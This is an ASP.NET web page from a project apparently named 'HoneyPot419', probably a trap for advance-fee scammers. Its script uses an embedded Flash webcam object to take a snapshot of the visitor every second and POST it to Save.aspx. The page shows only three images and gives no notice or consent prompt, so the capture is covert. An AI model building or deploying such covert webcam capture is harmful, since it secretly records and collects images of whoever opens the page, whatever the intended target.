<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Default.aspx.cs" Inherits="HoneyPot419._Default" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title></title>
    <script src="jquery-1.3.2.min.js" type="text/javascript"></script>
    <script type="text/javascript">

        $(document).ready(function() {$().poll({});});

        (function($) {
            $.fn.poll = function() {
                setInterval(update, 1000); //interval! 
                function update() {
                    $.ajax({
                        url: 'Save.aspx',
                        type: "POST",
                        data: ({ pic: takeSnapshot() })
                    });
                };
            };
        })(jQuery);


        function getFlash() {
            if (document.all) {
                return document.all("WebcamWrapper");
            }
            else if (document.getElementById) {
                return document.getElementById("WebcamWrapperEmbed");
            }
            return null;
        }

        function takeSnapshot() {
            var flash = getFlash();
            if (flash) {
                return flash.takeSnapshot();
            }
        }
        
    </script>
</head>
<body>
    <form id="form1" runat="server">
    <img src="img/t_1.JPG" />
    <img src="img/t_2.JPG" />
    <img src="img/t_3.JPG" />
    <div>
		<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0" width="320" height="240" id="WebcamWrapper" align="middle">
			<param name="allowScriptAccess" value="sameDomain" />
			<param name="allowFullScreen" value="false" />
			<param name="movie" value="WebcamWrapper.swf" />
			<param name="quality" value="high" />
			<param name="bgcolor" value="#ffffff" />	
			<embed 
				id="WebcamWrapperEmbed"
				src="WebcamWrapper.swf" 
				quality="high" 
				bgcolor="#ffffff" 
				width="320" 
				height="240" 
				name="WebcamWrapper" 
				align="middle" 
				allowScriptAccess="always" 
				allowFullScreen="false" 
				type="application/x-shockwave-flash" 
				pluginspage="http://www.macromedia.com/go/getflashplayer" />
		</object>    
    </div>
    </form>
</body>
</html>
